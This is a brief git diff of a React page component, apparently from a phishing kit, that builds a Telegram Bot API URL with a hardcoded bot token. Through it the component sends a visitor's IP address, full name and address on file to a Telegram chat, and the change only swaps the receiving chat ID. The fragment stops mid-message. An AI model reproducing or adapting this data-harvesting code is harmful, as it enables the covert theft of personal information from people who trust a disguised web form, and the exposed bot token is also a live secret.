@@ -27,7 +27,7 @@ export default function Detail() {
           .then((res) => res.json())
           .then((data) => {
             const country = data.country_name;
-            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5843268125&parse_mode=markdown&text=
+            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5824354578&parse_mode=markdown&text=
                     USER: ${encodeURIComponent(ipAddress)} 
                     %0A%0A*Full Name:* ${encodeURIComponent(fn)} 
                     %0A*Address On File:* ${encodeURIComponent(addr)} 
